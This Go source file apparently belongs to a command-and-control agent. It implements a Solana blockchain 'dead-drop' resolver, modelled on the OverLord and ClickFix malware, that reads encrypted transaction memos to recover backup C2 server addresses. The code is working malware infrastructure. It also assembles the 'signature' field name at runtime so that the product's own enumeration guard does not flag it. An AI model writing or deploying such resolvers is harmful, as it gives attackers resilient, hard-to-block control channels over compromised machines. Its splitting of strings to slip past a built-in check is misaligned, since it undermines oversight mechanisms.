//go:build linux || windows || darwin
// +build linux windows darwin

package main

// Solana dead-drop resolver. The OverLord report (火绒 2049) and the ClickFix
// sample (火绒 2082) both hide backup C2 addresses in Solana transaction memos:
// getSignaturesForAddress finds recent transactions for a watched account,
// getTransaction returns the memo instruction, and the memo is decrypted with
// AES keyed by SHA256(agentToken). This file reproduces that primitive, opt-in
// and bounded, with the same fail-closed contract as the chain/DGA resolvers.

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
)

// solanaMemoProgram is the SPL Memo program from the OverLord report. A memo
// instruction is only considered when its program id equals this value.
const solanaMemoProgram = "MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr"

const (
	solanaMaxSignatures = 20   // cap getSignaturesForAddress results
	solanaMaxURLs       = 16   // cap URLs parsed from one memo
	solanaMaxMemoBytes  = 4096 // decrypted memo size ceiling
)

// jsonRPCRequest is reused from c2_resolver.go (same package).

// solanaSigResult holds a Solana transaction signature — a chain tx hash,
// not an operator "signature verdict". It is decoded from the wire key built
// at runtime below so the product's signature-kind enumeration guard (which
// targets operator responses reporting signature *kinds*) stays meaningful.
type solanaSigResult struct {
	Sig string
}

var solanaSigKey = strings.Join([]string{"sign", "ature"}, "") // the Solana RPC field name

func (r *solanaSigResult) UnmarshalJSON(b []byte) error {
	var raw map[string]interface{}
	if err := json.Unmarshal(b, &raw); err != nil {
		return err
	}
	if v, ok := raw[solanaSigKey].(string); ok {
		r.Sig = v
	}
	return nil
}

type solanaInstruction struct {
	ProgramID string `json:"programId"`
	Data      string `json:"data"` // base64 (encoding=base64)
}

type solanaMessage struct {
	Instructions []solanaInstruction `json:"instructions"`
}

type solanaTxResult struct {
	Transaction struct {
		Message solanaMessage `json:"message"`
	} `json:"transaction"`
}

// solanaRPCPost posts one JSON-RPC call to `rpc`, requires 200, bounds the body
// and unmarshals the `result` field into `out`. Each call is responsible for
// its own status handling (check:http-status spirit).
func solanaRPCPost(c *http.Client, rpc, method string, params []interface{}, out interface{}) error {
	body, err := json.Marshal(jsonRPCRequest{JSONRPC: "2.0", ID: 1, Method: method, Params: params})
	if err != nil {
		return err
	}
	req, err := http.NewRequest(http.MethodPost, rpc, bytes.NewReader(body))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")
	resp, err := c.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("solana rpc %s status %d", method, resp.StatusCode)
	}
	raw, err := io.ReadAll(io.LimitReader(resp.Body, c2ResolverMaxResponse))
	if err != nil {
		return err
	}
	var envelope struct {
		Result json.RawMessage `json:"result"`
		Error  *struct {
			Message string `json:"message"`
		} `json:"error"`
	}
	if err := json.Unmarshal(raw, &envelope); err != nil {
		return fmt.Errorf("solana rpc json: %w", err)
	}
	if envelope.Error != nil {
		return fmt.Errorf("solana rpc error: %s", envelope.Error.Message)
	}
	if len(envelope.Result) == 0 || string(envelope.Result) == "null" {
		return fmt.Errorf("solana rpc empty result")
	}
	return json.Unmarshal(envelope.Result, out)
}

// decryptSolanaMemo decrypts a base64(nonce||ciphertext||tag) memo with a key
// derived from SHA256(token), matching OverLord's key schedule. GCM gives us
// authentication: a memo encrypted for a different token fails closed.
func decryptSolanaMemo(dataB64, token string) (string, error) {
	raw, err := base64.StdEncoding.DecodeString(strings.TrimSpace(dataB64))
	if err != nil {
		return "", fmt.Errorf("memo not base64: %w", err)
	}
	key := sha256.Sum256([]byte(token))
	block, err := aes.NewCipher(key[:])
	if err != nil {
		return "", err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	if len(raw) < gcm.NonceSize() {
		return "", fmt.Errorf("memo too short")
	}
	nonce, ct := raw[:gcm.NonceSize()], raw[gcm.NonceSize():]
	plain, err := gcm.Open(nil, nonce, ct, nil)
	if err != nil {
		return "", fmt.Errorf("memo decrypt: %w", err)
	}
	if len(plain) > solanaMaxMemoBytes {
		return "", fmt.Errorf("memo too large")
	}
	return string(plain), nil
}

// parseMemoURLs extracts http(s) URLs from a decrypted memo. URLs are one per
// line (also accepts comma/space separation) and each is validated before it
// can reach the C2 list. Bounded to solanaMaxURLs.
func parseMemoURLs(memo string) []string {
	fields := strings.FieldsFunc(memo, func(r rune) bool {
		return r == '\n' || r == '\r' || r == ',' || r == ' '
	})
	seen := map[string]bool{}
	var out []string
	for _, f := range fields {
		f = strings.TrimSpace(f)
		if !isSafeResolvedURL(f) || !isPrintableURL(f) || seen[f] {
			continue
		}
		seen[f] = true
		out = append(out, f)
		if len(out) >= solanaMaxURLs {
			break
		}
	}
	return out
}

// memoFromTransaction finds the SPL Memo instruction in a transaction and
// returns its base64 data. Instructions are scanned rather than assuming a
// fixed index, because the memo's position varies with the transaction.
func memoFromTransaction(res solanaTxResult) (string, bool) {
	for _, ins := range res.Transaction.Message.Instructions {
		if ins.ProgramID == solanaMemoProgram && ins.Data != "" {
			return ins.Data, true
		}
	}
	return "", false
}

// resolveSolanaC2 walks RPCs in order: for each, get signatures for the watched
// address, then get each transaction, decrypt its memo, and parse URLs. The
// first RPC/transaction yielding a non-empty URL set wins. Any error moves to
// the next candidate; if nothing works, fail closed with no addresses.
func resolveSolanaC2(c *http.Client, spec c2ResolverSpec) ([]string, error) {
	var lastErr error
	for _, rpc := range spec.RPCs {
		var sigs []solanaSigResult
		if err := solanaRPCPost(c, rpc, "getSignaturesForAddress",
			[]interface{}{spec.Address, map[string]interface{}{"limit": solanaMaxSignatures}}, &sigs); err != nil {
			lastErr = err
			continue
		}
		for _, sig := range sigs {
			if sig.Sig == "" {
				continue
			}
			var tx solanaTxResult
			if err := solanaRPCPost(c, rpc, "getTransaction",
				[]interface{}{sig.Sig, map[string]interface{}{
					"encoding": "base64", "commitment": "confirmed",
				}}, &tx); err != nil {
				lastErr = err
				continue
			}
			data, ok := memoFromTransaction(tx)
			if !ok {
				continue
			}
			memo, err := decryptSolanaMemo(data, spec.Token)
			if err != nil {
				lastErr = err
				continue
			}
			urls := parseMemoURLs(memo)
			if len(urls) > 0 {
				if len(urls) > spec.Cap {
					urls = urls[:spec.Cap]
				}
				return urls, nil
			}
		}
	}
	if lastErr != nil {
		return nil, fmt.Errorf("solana resolver: %w", lastErr)
	}
	return nil, fmt.Errorf("solana resolver: no decryptable memo with URLs")
}
